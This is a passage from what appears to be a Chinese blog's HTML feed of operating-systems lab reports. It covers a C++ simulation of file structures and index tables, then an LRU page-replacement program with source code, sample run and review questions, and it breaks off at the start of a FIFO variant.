class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">string</span> user_name;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入要查看文件目录的用户名称:&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; user_name;<br><span class="hljs-comment">//找到用户在用户列表中的位置</span><br><span class="hljs-type">int</span> user_pos = findUser(user_name);<br><span class="hljs-keyword">if</span> (user_pos == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;该用户不存在！&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;用户&quot;</span> &lt;&lt; user_name &lt;&lt; <span class="hljs-string">&quot;的文件目录如下：&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;| 文件名 | 索引表地址 |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= file_cnt[user_pos]; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;| &quot;</span> &lt;&lt; setw(<span class="hljs-number">6</span>) &lt;&lt; file[user_pos][i] &lt;&lt; <span class="hljs-string">&quot; |    &quot;</span> &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">100</span> * (user_pos - <span class="hljs-number">1</span>) +<br>     (i - <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-string">&quot;    |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//查看某个用户的某个文件的索引表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">disTable</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">string</span> user_name;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入要查看索引表的用户名称:&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; user_name;<br><span class="hljs-comment">//找到用户在用户列表中的位置</span><br><span class="hljs-type">int</span> user_pos = findUser(user_name);<br><span class="hljs-keyword">if</span> (user_pos == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;该用户不存在！&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-built_in">string</span> file_name;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入要查看索引表的文件名称:&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; file_name;<br><span class="hljs-comment">//找到文件在文件目录中的位置</span><br><span class="hljs-type">int</span> file_pos = findFile(user_name, file_name);<br><span class="hljs-keyword">if</span> (file_pos == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;该文件不存在！&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;用户&quot;</span> &lt;&lt; user_name &lt;&lt; <span class="hljs-string">&quot;的文件&quot;</span> &lt;&lt; file_name &lt;&lt; <span class="hljs-string">&quot;的索引表如下：&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;| 记录号 | 物理块号 |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= block_cnt[user_pos][file_pos]; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;| &quot;</span> &lt;&lt; setw(<span class="hljs-number">6</span>) &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; |  &quot;</span> &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; table[user_pos][file_pos][i] &lt;&lt; <span class="hljs-string">&quot;    |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>init();<br><span class="hljs-type">int</span> op = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">while</span> (op)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;----------------------------------&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;1：创建新用户&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;2：添加新文件&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;3：删除用户&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;4：删除文件&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;5：查看用户列表&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;6：查看某用户的文件目录&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;7：查看某文件的索引表&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;8：查看磁盘剩余空间&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;0：退出&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入操作：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; op;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;----------------------------------&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>)<br>addUser();<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>)<br>addFile();<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">3</span>)<br>delUser();<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">4</span>)<br>delFile();<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">5</span>)<br>disUser();<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">6</span>)<br>disFile();<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">7</span>)<br>disTable();<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">8</span>)<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;磁盘剩余空间为：&quot;</span> &lt;&lt; rest &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">0</span>)<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;程序结束！&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;----------------------------------&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h3><ol><li><p>添加用户A及用户A的文件a。</p><p><img src="/2022/01/13/FileStructure/image-20211221130636419.png" alt="image-20211221130636419"></p></li><li><p>查看磁盘剩余空间</p><p><img src="/2022/01/13/FileStructure/image-20211221130704608.png" alt="image-20211221130704608"></p></li><li><p>添加用户B，查看用户列表</p><p><img src="/2022/01/13/FileStructure/image-20211221130729964.png" alt="image-20211221130729964"></p></li><li><p>查看用户A的文件目录和文件a的索引表</p><p><img src="/2022/01/13/FileStructure/image-20211221130813499.png" alt="image-20211221130813499"></p></li><li><p>删除文件a，再查看磁盘剩余空间</p><p><img src="/2022/01/13/FileStructure/image-20211221130854161.png" alt="image-20211221130854161"></p></li><li><p>删除用户A，再查看用户列表，最后退出。</p><p><img src="/2022/01/13/FileStructure/image-20211221131215559.png" alt="image-20211221131215559"></p></li></ol><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>链表文件结构和索引文件结构各自的优缺点是什么？</p><h4 id="链表文件结构："><a href="#链表文件结构：" class="headerlink" title="链表文件结构："></a>链表文件结构：</h4><p><strong>优点</strong></p><p>① 消除了外部碎片，故而显著地提高了外存空间的利用率；</p><p>② 因为是根据文件的当前需要，为它分配必需的盘块，当文件动态增长时，可动态地再为它分配盘块，故而无需事先知道文件的大小；</p><p>③ 对文件的增、删、改十分方便。</p><p><strong>缺点</strong></p><p>① 不能支持高效的直接存取。 要对一个较大的文件进行直接存取， 须首先在 FAT 中顺序地查找许多盘块号。</p><p>② FAT 需占用较大的内存空间。</p><h4 id="索引文件结构："><a href="#索引文件结构：" class="headerlink" title="索引文件结构："></a>索引文件结构：</h4><p><strong>优点</strong></p><p>① 支持直接访问。当要读文件的第 i 个盘块时，可以方便地直接从索引块中找到第 i 个盘块的盘块号。</p><p>② 不会产生外部碎片。</p><p><strong>缺点</strong></p><p>可能要花费较多的外存空间，系统开销较大。</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>当文件较大时，使得索引表也较大，如果索引表的大小超过了一个物理块，如何进行索引表的存取？</p><p>① 采用多级索引方式来解决，使索引表所指的物理块中存储文件信息对应的物理块地址。这样对索引表的长度没有限制，但是空间上的开销比较大。</p><p>② 通过分页式内存管理进行存取，使较大的索引表存储时按照块来分割，一定程度上利用了内存空间。但是文件的读取和存储都是分块进行的，而且位置之间没有顺序性，所以存取的算法复杂度较高。</p><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><p>​        该实验使我加深了对两种文件结构的理解。其中在实现MS_DOS磁盘文件的存储结构时，要注意文件定位表实现链接的处理，在插入时把握好头插入、中间插入、尾插入三种情况。实现便于直接存取的索引文件结构时，使用的数组较多，在进行存、删操作的实现时，要把握好这各类数组之间的关系，处理好细节。总之，这次实验使我的动手编程能力有所提升。</p>]]></content>
    
    
    <categories>
      
      <category>操作系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最近最久未使用（LRU）置换算法的C++实现</title>
    <link href="/2021/12/29/LRU_Algorithm/"/>
    <url>/2021/12/29/LRU_Algorithm/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统实验-最近最久未使用（LRU）置换算法"><a href="#操作系统实验-最近最久未使用（LRU）置换算法" class="headerlink" title="操作系统实验 最近最久未使用（LRU）置换算法"></a>操作系统实验 最近最久未使用（LRU）置换算法</h1><h2 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h2><ol><li><p>最近最久未使用（LRU）置换算法原理就是：当需要淘汰某页面时，选择当前一段时间内最久未使用过的页先淘汰，即淘汰距当前最远的上次使用的页。</p><ul><li><p>例如: 分配给该进程的页块数为3，一个20位长的页面访问序列为:12560,36536,56042,70435，则缺页次数和缺页率按下图给出:</p><p><img src="/2021/12/29/LRU_Algorithm/image-20211207201735320.png" alt="image-20211207201735320"></p><p>注：原实验指导书上图示有误，该图为笔者制作。</p></li></ul></li></ol><ol><li><p>假定分配给该进程的页块数为3，页面访问序列长度为20。本实验可以采用数组结构实现，首先随机产生页面序列，当发生请求调页时，若内存已满，则需要利用LRU算法，将当前一段时间内最久未使用过的页替换出去。</p><ul><li><p>模拟程序的算法如下图：</p><p><img src="/2021/12/29/LRU_Algorithm/image-20211207202046671.png" alt="image-20211207202046671"></p></li></ul></li></ol><h2 id="程序中使用的数据结构及符号说明"><a href="#程序中使用的数据结构及符号说明" class="headerlink" title="程序中使用的数据结构及符号说明"></a>程序中使用的数据结构及符号说明</h2><ol><li><p>数组（数据结构）记录信息</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> memory[<span class="hljs-number">1001</span>];      <span class="hljs-comment">//记录进程内存中的页</span><br><span class="hljs-type">bool</span> flag[<span class="hljs-number">1001</span>];       <span class="hljs-comment">//标记：访问的页面是否在内存中</span><br><span class="hljs-type">int</span> l_time[<span class="hljs-number">1001</span>];      <span class="hljs-comment">//记录页面的最近使用时间</span><br><span class="hljs-type">int</span> vis[<span class="hljs-number">1001</span>];         <span class="hljs-comment">//记录访问序列</span><br><span class="hljs-type">bool</span> miss[<span class="hljs-number">1001</span>];       <span class="hljs-comment">//记录每次访问的缺页状态</span><br><span class="hljs-type">int</span> state[<span class="hljs-number">1001</span>][<span class="hljs-number">1001</span>]; <span class="hljs-comment">//记录每次访问后的进程的内存页面状态</span><br></code></pre></div></td></tr></table></figure></li><li><p>整型变量</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> n;                 <span class="hljs-comment">//进程内存的页块数</span><br><span class="hljs-type">int</span> now_num = <span class="hljs-number">0</span>;       <span class="hljs-comment">//进程内存当前的页个数</span><br><span class="hljs-type">int</span> now_time = <span class="hljs-number">0</span>;      <span class="hljs-comment">//当前时间(访问次数)</span><br><span class="hljs-type">int</span> m;                 <span class="hljs-comment">//页面访问序列的长度</span><br><span class="hljs-type">int</span> miss_num = <span class="hljs-number">0</span>;      <span class="hljs-comment">//缺页次数</span><br></code></pre></div></td></tr></table></figure></li><li><p>缺页率</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">double</span> miss_rate;      <span class="hljs-comment">//缺页率</span><br></code></pre></div></td></tr></table></figure></li><li><p>自定义函数</p><ul><li><code>void init()</code>：初始化</li><li><code>void LRU(int a)</code>：LRU算法的实现</li><li><code>void display()</code>：输出信息</li></ul></li></ol><h2 id="源程序及注释"><a href="#源程序及注释" class="headerlink" title="源程序及注释"></a>源程序及注释</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iomanip&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> n;                 <span class="hljs-comment">//进程内存的页块数</span><br><span class="hljs-type">int</span> now_num = <span class="hljs-number">0</span>;       <span class="hljs-comment">//进程内存当前的页个数</span><br><span class="hljs-type">int</span> now_time = <span class="hljs-number">0</span>;      <span class="hljs-comment">//当前时间(访问次数)</span><br><span class="hljs-type">int</span> m;                 <span class="hljs-comment">//页面访问序列的长度</span><br><span class="hljs-type">int</span> miss_num = <span class="hljs-number">0</span>;      <span class="hljs-comment">//缺页次数</span><br><span class="hljs-type">double</span> miss_rate;      <span class="hljs-comment">//缺页率</span><br><span class="hljs-type">int</span> memory[<span class="hljs-number">1001</span>];      <span class="hljs-comment">//记录进程内存中的页</span><br><span class="hljs-type">bool</span> flag[<span class="hljs-number">1001</span>];       <span class="hljs-comment">//标记：访问的页面是否在内存中</span><br><span class="hljs-type">int</span> l_time[<span class="hljs-number">1001</span>];      <span class="hljs-comment">//记录页面的最近使用时间</span><br><span class="hljs-type">int</span> vis[<span class="hljs-number">1001</span>];         <span class="hljs-comment">//记录访问序列</span><br><span class="hljs-type">bool</span> miss[<span class="hljs-number">1001</span>];       <span class="hljs-comment">//记录每次访问的缺页状态</span><br><span class="hljs-type">int</span> state[<span class="hljs-number">1001</span>][<span class="hljs-number">1001</span>]; <span class="hljs-comment">//记录每次访问后的进程的内存页面状态</span><br><br><span class="hljs-comment">//初始化</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入分配给该进程的页块数：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; n;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入页面访问序列的长度：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; m;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入访问序列：&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)<br>&#123;<br><span class="hljs-built_in">cin</span> &gt;&gt; vis[i];<br>&#125;<br><span class="hljs-comment">//进程的内存中刚开始没有页，初始化为-1</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>memory[i] = <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//在内存中的标记初始化为false</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++)<br>&#123;<br>flag[i] = <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-comment">//页面的最近使用时间初始化为0</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++)<br>&#123;<br>l_time[i] = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//LRU算法</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">LRU</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span><br>&#123;<br><span class="hljs-comment">//检查请求访问的页是否在进程的内存中</span><br><span class="hljs-keyword">if</span> (flag[a] == <span class="hljs-literal">false</span>)<br>&#123;<br>miss[now_time] = <span class="hljs-number">1</span>; <span class="hljs-comment">//此次标记：缺页</span><br>miss_num++;<br><span class="hljs-keyword">if</span> (now_num == n) <span class="hljs-comment">//内存已满</span><br>&#123;<br><span class="hljs-type">int</span> min_time = <span class="hljs-number">0x3f3f3f</span>, min_num = <span class="hljs-number">-1</span>;<br><span class="hljs-comment">//在内存中的页中，最早被访问时间和最久未使用过的页在内存中的编号</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; now_num; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (l_time[memory[i]] &lt; min_time)<br>&#123;<br>min_time = l_time[memory[i]];<br>min_num = i;<br>&#125;<br>&#125;<br>flag[a] = <span class="hljs-literal">true</span>;            <span class="hljs-comment">//将当前访问的页“是否在内存中”的标记设为1</span><br>flag[memory[min_num]] = <span class="hljs-number">0</span>; <span class="hljs-comment">//将被替换的页“是否在内存中”的标记设为0</span><br>memory[min_num] = a;       <span class="hljs-comment">//当前页替换最久未使用过的页</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-comment">//内存未满</span><br>&#123;<br>flag[a] = <span class="hljs-literal">true</span>;<br>memory[now_num] = a; <span class="hljs-comment">//当前页进入内存的下一个位置</span><br>now_num++;           <span class="hljs-comment">//内存中页的个数加1</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>miss[now_time] = <span class="hljs-number">0</span>; <span class="hljs-comment">//标记：未缺页</span><br>&#125;<br><span class="hljs-comment">//保存内存中页面的序列</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>state[now_time][i] = memory[i];<br>&#125;<br>l_time[a] = now_time; <span class="hljs-comment">//更新当前页的被访问时间为当前时间</span><br>now_time++;           <span class="hljs-comment">//访问完一个页面，当前时间加1</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">//输出表头</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|访问|&quot;</span>;<br><span class="hljs-type">int</span> left = n - n / <span class="hljs-number">2</span> - <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> right = n / <span class="hljs-number">2</span>;<br><span class="hljs-keyword">while</span> (left--)<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;    &quot;</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;序列&quot;</span>;<br><span class="hljs-keyword">while</span> (right--)<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;    &quot;</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|是否缺页|&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; vis[i] &lt;&lt; <span class="hljs-string">&quot;|&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (state[i][j] != <span class="hljs-number">-1</span>)<br><span class="hljs-built_in">cout</span> &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; state[i][j];<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;    &quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (miss[i] == <span class="hljs-number">1</span>) <span class="hljs-comment">//输出“是”和“否”比较丑</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|    1   |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|    0   |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;缺页次数：&quot;</span> &lt;&lt; miss_num &lt;&lt; <span class="hljs-built_in">endl</span>;<br>miss_rate = (<span class="hljs-type">double</span>)miss_num / m;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;缺页率：&quot;</span> &lt;&lt; miss_num &lt;&lt; <span class="hljs-string">&quot;/&quot;</span> &lt;&lt; m &lt;&lt; <span class="hljs-string">&quot;=&quot;</span> &lt;&lt; setprecision(<span class="hljs-number">2</span>) &lt;&lt; miss_rate &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>init();<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)<br>&#123;<br>LRU(vis[i]);<br>&#125;<br>display();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="程序运行时的初值及运行结果"><a href="#程序运行时的初值及运行结果" class="headerlink" title="程序运行时的初值及运行结果"></a>程序运行时的初值及运行结果</h2><h3 id="初值"><a href="#初值" class="headerlink" title="初值"></a>初值</h3><p>分配给该进程的页块数：3</p><p>页面访问序列的长度：20</p><p>访问序列：1 2 5 6 0 3 6 5 3 6 5 6 0 4 2 7 0 4 3 5</p><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="/2021/12/29/LRU_Algorithm/image-20211221083746165.png" alt="image-20211221083746165"></p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><ul><li>比较LRU和其他置换算法各自的优缺点，能够实现其他置换算法模拟设计，分析内存页面数的变化对各种置换算法命中率。</li></ul><h3 id="FIFO算法"><a href="#FIFO算法" class="headerlink" title="FIFO算法"></a>FIFO算法</h3><p>  与前文LRU算法的实现不同的是，在FIFO算法中，<code>l_time[1001]</code>记录页面进入内存的时间。算法实现如下：</p>  <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 